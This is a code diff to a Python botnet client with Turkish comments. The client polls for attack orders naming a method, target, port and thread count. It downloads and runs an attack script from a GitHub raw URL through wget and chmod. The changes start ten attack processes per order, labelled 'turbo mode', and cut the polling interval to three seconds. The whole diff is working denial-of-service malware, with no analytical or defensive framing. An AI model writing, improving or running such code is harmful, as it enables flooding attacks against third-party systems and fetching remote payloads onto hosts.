@@ -10,11 +10,9 @@ ZOMBI_AD = f"Zombi-{os.uname()[1]}"
 
 def temizlik_yap():
     print("🧹 Eski mühimmatlar temizleniyor...")
-    # attack.py ile başlayan her şeyi (attack.py.1, .2 vs.) ve eski logları siler
     os.system("rm -f attack.py* slave.py* attack.log")
     
     print("📦 En güncel dosyalar mühimmat deposundan (GitHub) çekiliyor...")
-    # GitHub'dan en temiz hallerini çekiyoruz
     os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
     os.system("chmod +x attack.py")
 
@@ -39,7 +37,6 @@ def komut_dinle():
                     thread_sayisi = t if t else 200
                     print(f"\n[!] EMİR GELDİ: {method.upper()} -> {target}:{port} | Thread: {thread_sayisi}")
 
-                    # Dosya silinmişse veya yoksa tekrar çek (Güvenlik önlemi)
                     if not os.path.exists("attack.py"):
                         os.system("wget -q https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/attack.py")
 
@@ -49,12 +46,17 @@ def komut_dinle():
                         str(thread_sayisi), str(s)
                     ]
                     
+                    # --- TURBO MODU: BURASI HATTI ŞİŞİRECEK ---
                     with open("attack.log", "a") as log_file:
-                        subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
+                        # Tek bir işlem yerine 10 farklı koldan saldırıyı başlatıyoruz
+                        # Bu sayede GitHub'ın o devasa hattını sonuna kadar zorlayacağız.
+                        for i in range(10):
+                            subprocess.Popen(attack_cmd, stdout=log_file, stderr=log_file)
                     
-                    print(f"✅ Mermiler taze dosyadan ateşlendi!")
+                    print(f"✅ ✅ 10 KAT GÜÇLE: Mermiler taze dosyadan ateşlendi!")
 
-            time.sleep(5)
+            # Komut kontrol süresini biraz kısalttım (5 saniyeden 3'e) daha seri olsun
+            time.sleep(3)
             
         except Exception as e:
             print(f"⚠️ Bağlantı bekleniyor... ({e})")
